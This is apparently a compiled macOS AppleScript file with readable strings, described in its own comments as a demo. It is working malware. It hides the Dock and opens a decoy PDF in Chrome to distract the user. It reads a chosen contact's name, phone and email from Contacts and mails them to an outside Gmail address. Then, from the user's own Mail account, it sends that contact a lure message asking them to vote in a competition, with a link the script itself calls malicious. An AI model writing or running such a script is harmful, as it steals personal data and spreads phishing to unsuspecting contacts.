FasdUAS 1.101.10   ��   ��    k             l     ��  ��    g a This script finds the name of a specified Contact and emails their name, number and email to us.     � 	 	 �   T h i s   s c r i p t   f i n d s   t h e   n a m e   o f   a   s p e c i f i e d   C o n t a c t   a n d   e m a i l s   t h e i r   n a m e ,   n u m b e r   a n d   e m a i l   t o   u s .   
  
 l     ��  ��    M G Then it emails the Contact from the User's Email with a malicious link     �   �   T h e n   i t   e m a i l s   t h e   C o n t a c t   f r o m   t h e   U s e r ' s   E m a i l   w i t h   a   m a l i c i o u s   l i n k      l     ��������  ��  ��        l     ��  ��    C = Hides the dock to prevent user from seeing what is happening     �   z   H i d e s   t h e   d o c k   t o   p r e v e n t   u s e r   f r o m   s e e i n g   w h a t   i s   h a p p e n i n g      l     ����  O         r        m    ��
�� boovtrue  n          1    
��
�� 
dahd  1    ��
�� 
dpas  m       �                                                                                  sevs  alis    \  Macintosh HD               � =BD ����System Events.app                                              ����� =        ����  
 cu             CoreServices  0/:System:Library:CoreServices:System Events.app/  $  S y s t e m   E v e n t s . a p p    M a c i n t o s h   H D  -System/Library/CoreServices/System Events.app   / ��  ��  ��       !   l     ��������  ��  ��   !  " # " l     �� $ %��   $ : 4 A function that checks if an application is running    % � & & h   A   f u n c t i o n   t h a t   c h e c k s   i f   a n   a p p l i c a t i o n   i s   r u n n i n g #  ' ( ' i      ) * ) I      �� +���� ,0 isapplicationrunning isApplicationRunning +  ,�� , o      ���� 0 appname appName��  ��   * O      - . - k     / /  0 1 0 r     2 3 2 6    4 5 4 2    ��
�� 
pcap 5 =    6 7 6 1   	 ��
�� 
pnam 7 o    ���� 0 appname appName 3 o      ���� 0 runningapps runningApps 1  8�� 8 L     9 9 >    : ; : l    <���� < I   �� =��
�� .corecnte****       **** = o    ���� 0 runningapps runningApps��  ��  ��   ; m    ����  ��   . m      > >�                                                                                  sevs  alis    \  Macintosh HD               � =BD ����System Events.app                                              ����� =        ����  
 cu             CoreServices  0/:System:Library:CoreServices:System Events.app/  $  S y s t e m   E v e n t s . a p p    M a c i n t o s h   H D  -System/Library/CoreServices/System Events.app   / ��   (  ? @ ? l     ��������  ��  ��   @  A B A l     �� C D��   C / ) Distracts user with fake pdf application    D � E E R   D i s t r a c t s   u s e r   w i t h   f a k e   p d f   a p p l i c a t i o n B  F G F l    H���� H O     I J I I   ������
�� .ascrnoop****      � ****��  ��   J m     K K�                                                                                  rimZ  alis    >  Macintosh HD               � =BD ����Google Chrome.app                                              ����߽�        ����  
 cu             Applications  !/:Applications:Google Chrome.app/   $  G o o g l e   C h r o m e . a p p    M a c i n t o s h   H D  Applications/Google Chrome.app  / ��  ��  ��   G  L M L l     ��������  ��  ��   M  N O N l     �� P Q��   P ( " Reopens the window multiple times    Q � R R D   R e o p e n s   t h e   w i n d o w   m u l t i p l e   t i m e s O  S T S l    U���� U r     V W V m    ����   W o      ���� 0 counter  ��  ��   T  X Y X l   c Z���� Z T    c [ [ Z   ! ^ \ ]���� \ l  ! ' ^���� ^ I   ! '�� _���� ,0 isapplicationrunning isApplicationRunning _  `�� ` m   " # a a � b b  G o o g l e   C h r o m e��  ��  ��  ��   ] k   * Z c c  d e d O   * B f g f k   . A h h  i j i I  . 3������
�� .ascrnoop****      � ****��  ��   j  k l k I  4 ;���� m
�� .corecrel****      � null��   m �� n��
�� 
kocl n m   6 7��
�� 
cwin��   l  o�� o I  < A�� p��
�� .GURLGURLnull��� ��� TEXT p m   < = q q � r r h t t p s : / / m y f u t u r e . e d u . a u / d o c s / d e f a u l t - s o u r c e / e n t r y - l e v e l - r e s u m e s / r e s u m e _ s a m p l e _ s t u d e n t 8 e a 4 7 e 0 4 a 8 f e 6 7 e 6 b 7 a c f f 0 0 0 0 3 7 6 a 3 b . p d f ? s f v r s n = c 4 3 a 2 7 d 9 _ 6��  ��   g m   * + s s�                                                                                  rimZ  alis    >  Macintosh HD               � =BD ����Google Chrome.app                                              ����߽�        ����  
 cu             Applications  !/:Applications:Google Chrome.app/   $  G o o g l e   C h r o m e . a p p    M a c i n t o s h   H D  Applications/Google Chrome.app  / ��   e  t u t r   C H v w v [   C F x y x o   C D���� 0 counter   y m   D E����  w o      ���� 0 counter   u  z { z l  I I��������  ��  ��   {  | } | l  I I�� ~ ��   ~ R L Would probably set this to 10-20. It has been reduced for the sake the demo     � � � �   W o u l d   p r o b a b l y   s e t   t h i s   t o   1 0 - 2 0 .   I t   h a s   b e e n   r e d u c e d   f o r   t h e   s a k e   t h e   d e m o }  � � � Z   I T � ����� � =  I L � � � o   I J���� 0 counter   � m   J K����  �  S   O P��  ��   �  ��� � I  U Z�� ���
�� .sysodelanull��� ��� nmbr � m   U V���� ��  ��  ��  ��  ��  ��   Y  � � � l     ��������  ��  ��   �  � � � l     �� � ���   � 1 + Steals contact info of a specified Contact    � � � � V   S t e a l s   c o n t a c t   i n f o   o f   a   s p e c i f i e d   C o n t a c t �  � � � l  d g ����� � r   d g � � � m   d e � � � � �  F a k e   C o n t a c t � o      ���� 0 wantedcontact wantedContact��  ��   �  � � � l  h � ����� � O   h � � � � k   n � � �  � � � r   n � � � � 6  n � � � � 2   n s��
�� 
azf4 � =  v  � � � 1   w {��
�� 
pnam � o   | ~���� 0 wantedcontact wantedContact � o      ���� 0 foundcontacts foundContacts �  � � � Z   � � � ��� � � ?  � � � � � l  � � ����� � I  � ��� ���
�� .corecnte****       **** � o   � ����� 0 foundcontacts foundContacts��  ��  ��   � m   � �����   � k   � � � �  � � � r   � � � � � n   � � � � � 4   � ��� �
�� 
cobj � m   � �����  � o   � ����� 0 foundcontacts foundContacts � o      ���� 0 contact   �  � � � r   � � � � � n   � � � � � 1   � ���
�� 
az17 � n   � � � � � 4   � ��� �
�� 
az20 � m   � �����  � o   � ����� 0 contact   � o      ���� 0 phonenumbers phoneNumbers �  � � � r   � � � � � n   � � � � � 1   � ���
�� 
az17 � n   � � � � � m   � ���
�� 
az21 � o   � ����� 0 contact   � o      ���� 0 contactemail contactEmail �  ��� � r   � � � � � b   � � � � � b   � � � � � b   � � � � � b   � � � � � b   � � � � � m   � � � � � � �  N a m e :   � o   � ����� 0 wantedcontact wantedContact � m   � � � � � � �   ,   P h o n e   N u m b e r :   � o   � ����� 0 phonenumbers phoneNumbers � m   � � � � � � �  ,   E m a i l :   � o   � ����� 0 contactemail contactEmail � o      ���� 0 details  ��  ��   � r   � � � � � m   � � � � � � � " C o n t a c t   N o t   F o u n d � o      ���� 0 details   �  ��� � I  � �������
�� .aevtquitnull��� ��� null��  ��  ��   � m   h k � ��                                                                                  adrb  alis    8  Macintosh HD               � =BD ����Contacts.app                                                   ����� =        ����  
 cu             Applications  #/:System:Applications:Contacts.app/     C o n t a c t s . a p p    M a c i n t o s h   H D   System/Applications/Contacts.app  / ��  ��  ��   �  � � � l     �������  ��  �   �  � � � l     �~ � ��~   � � � Got the structure of how to send an email using apple scripts from this query: https://gist.github.com/youandhubris/9e292822e3db8f91df93234db092906e    � � � �*   G o t   t h e   s t r u c t u r e   o f   h o w   t o   s e n d   a n   e m a i l   u s i n g   a p p l e   s c r i p t s   f r o m   t h i s   q u e r y :   h t t p s : / / g i s t . g i t h u b . c o m / y o u a n d h u b r i s / 9 e 2 9 2 8 2 2 e 3 d b 8 f 9 1 d f 9 3 2 3 4 d b 0 9 2 9 0 6 e �  � � � l  �� ��}�| � Z   �� � ��{�z � >  � � � � � o   � ��y�y 0 details   � m   � � � � � � � " C o n t a c t   N o t   F o u n d � O   �� � � � k   �� � �  � � � l  � ��x � ��x   � &   email contact details to myself    � � � � @   e m a i l   c o n t a c t   d e t a i l s   t o   m y s e l f �  � � � r   � � � � m   � � � � � � � 0 r u b b e r d u c k y . k k @ g m a i l . c o m � o      �w�w 0 theto theTo �  � � � r  	   m   � . G o t   t h e i r   c o n t a c t   L i s t ! o      �v�v 0 
thesubject 
theSubject �  r  
0 I 
,�u�t
�u .corecrel****      � null�t   �s	

�s 
kocl	 m  �r
�r 
bcke
 �q�p
�q 
prdt K  & �o
�o 
subj o  �n�n 0 
thesubject 
theSubject �m
�m 
ctnt o  �l�l 0 details   �k�j
�k 
pvis m  !"�i
�i boovtrue�j  �p   o      �h�h 0 
themessage 
theMessage  O  1W I 7V�g�f
�g .corecrel****      � null�f   �e
�e 
kocl m  9<�d
�d 
rcpt �c
�c 
insh n  ?E  ;  DE 2 ?D�b
�b 
trcp �a�`
�a 
prdt K  HP �_�^
�_ 
radd o  KN�]�] 0 theto theTo�^  �`   o  14�\�\ 0 
themessage 
theMessage  !  I X_�["�Z
�[ .emsgsendnull���     bcke" o  X[�Y�Y 0 
themessage 
theMessage�Z  ! #$# l ``�X�W�V�X  �W  �V  $ %&% l ``�U'(�U  ' &   email contact from user's email   ( �)) @   e m a i l   c o n t a c t   f r o m   u s e r ' s   e m a i l& *+* r  `g,-, o  `c�T�T 0 contactemail contactEmail- o      �S�S 0 theto theTo+ ./. r  ho010 m  hk22 �33  Q u i c k   T a s k1 o      �R�R 0 
thesubject 
theSubject/ 454 r  p�676 b  p�898 b  p}:;: b  py<=< b  pu>?> m  ps@@ �AA  H e y  ? o  st�Q�Q 0 wantedcontact wantedContact= m  uxBB �CC  ,; o  y|�P
�P 
ret 9 m  }�DD �EE2 J u s t   q u i c k l y   w a n t e d   t o   a s k   i f   y o u   c o u l d   v o t e   f o r   m e   f o r   t h i s   c o m p e t i t i o n   I   e n t e r e d   a t   w o r k .   H e r e ' s   t h e   l i n k :   h t t p s : / / w w w . c l e a r n e t w o r k . c o m / m a l i c i o u s - u r l s /7 o      �O�O $0 maliciouscontent maliciousContent5 FGF r  ��HIH I ���N�MJ
�N .corecrel****      � null�M  J �LKL
�L 
koclK m  ���K
�K 
bckeL �JM�I
�J 
prdtM K  ��NN �HOP
�H 
subjO o  ���G�G 0 
thesubject 
theSubjectP �FQR
�F 
ctntQ o  ���E�E $0 maliciouscontent maliciousContentR �DS�C
�D 
pvisS m  ���B
�B boovtrue�C  �I  I o      �A�A 0 
themessage 
theMessageG TUT O  ��VWV I ���@�?X
�@ .corecrel****      � null�?  X �>YZ
�> 
koclY m  ���=
�= 
rcptZ �<[\
�< 
insh[ n  ��]^]  ;  ��^ 2 ���;
�; 
trcp\ �:_�9
�: 
prdt_ K  ��`` �8a�7
�8 
radda o  ���6�6 0 theto theTo�7  �9  W o  ���5�5 0 
themessage 
theMessageU bcb I ���4d�3
�4 .emsgsendnull���     bcked o  ���2�2 0 
themessage 
theMessage�3  c efe l ���1�0�/�1  �0  �/  f ghg I ���.i�-
�. .sysodelanull��� ��� nmbri m  ���,�, �-  h j�+j I ���*�)�(
�* .aevtquitnull��� ��� null�)  �(  �+   � m   � �kk�                                                                                  emal  alis    (  Macintosh HD               � =BD ����Mail.app                                                       ����� =        ����  
 cu             Applications  /:System:Applications:Mail.app/     M a i l . a p p    M a c i n t o s h   H D  System/Applications/Mail.app  / ��  �{  �z  �}  �|   � lml l     �'�&�%�'  �&  �%  m non l     �$�#�"�$  �#  �"  o pqp l     �!rs�!  r   brings dock back   s �tt "   b r i n g s   d o c k   b a c kq uvu l ��w� �w O  ��xyx r  ��z{z m  ���
� boovfals{ n      |}| 1  ���
� 
dahd} 1  ���
� 
dpasy m  ��~~�                                                                                  sevs  alis    \  Macintosh HD               � =BD ����System Events.app                                              ����� =        ����  
 cu             CoreServices  0/:System:Library:CoreServices:System Events.app/  $  S y s t e m   E v e n t s . a p p    M a c i n t o s h   H D  -System/Library/CoreServices/System Events.app   / ��  �   �  v � l     ����  �  �  � ��� l     ����  �  �  � ��� l     ����  �  �  �       �����  � ��� ,0 isapplicationrunning isApplicationRunning
� .aevtoappnull  �   � ****� � *������ ,0 isapplicationrunning isApplicationRunning� �
��
 �  �	�	 0 appname appName�  � ��� 0 appname appName� 0 runningapps runningApps�  >����
� 
pcap�  
� 
pnam
� .corecnte****       ****� � *�-�[�,\Z�81E�O�j jU� ������� 
� .aevtoappnull  �   � ****� k    ���  ��  F��  S��  X��  ���  ���  ��� u����  �  �  �  � < ���� K���� a�������� q���� ��� ������������������������ � � ��� ��� �k �������������������������������2@B��D��
�� 
dpas
�� 
dahd
�� .ascrnoop****      � ****�� 0 counter  �� ,0 isapplicationrunning isApplicationRunning
�� 
kocl
�� 
cwin
�� .corecrel****      � null
�� .GURLGURLnull��� ��� TEXT
�� .sysodelanull��� ��� nmbr�� 0 wantedcontact wantedContact
�� 
azf4
�� 
pnam�� 0 foundcontacts foundContacts
�� .corecnte****       ****
�� 
cobj�� 0 contact  
�� 
az20
�� 
az17�� 0 phonenumbers phoneNumbers
�� 
az21�� 0 contactemail contactEmail�� 0 details  
�� .aevtquitnull��� ��� null�� 0 theto theTo�� 0 
thesubject 
theSubject
�� 
bcke
�� 
prdt
�� 
subj
�� 
ctnt
�� 
pvis�� �� �� 0 
themessage 
theMessage
�� 
rcpt
�� 
insh
�� 
trcp
�� 
radd
�� .emsgsendnull���     bcke
�� 
ret �� $0 maliciouscontent maliciousContent� �� 	e*�,�,FUO� *j UOjE�O FhZ*�k+  5� *j O*��l 
O�j UO�kE�O�m  Y hOkj Y h[OY��O�E�Oa  |*a -a [a ,\Z�81E` O_ j j L_ a k/E` O_ a k/a ,E` O_ a ,a ,E` Oa �%a %_ %a %_ %E`  Y 	a !E`  O*j "UO_  a # �a $ �a %E` &Oa 'E` (O*�a )a *a +_ (a ,_  a -ea .a / 
E` 0O_ 0 !*�a 1a 2*a 3-6a *a 4_ &la . 
UO_ 0j 5O_ E` &Oa 6E` (Oa 7�%a 8%_ 9%a :%E` ;O*�a )a *a +_ (a ,_ ;a -ea .a / 
E` 0O_ 0 !*�a 1a 2*a 3-6a *a 4_ &la . 
UO_ 0j 5Okj O*j "UY hO� 	f*�,�,FUascr  ��ޭ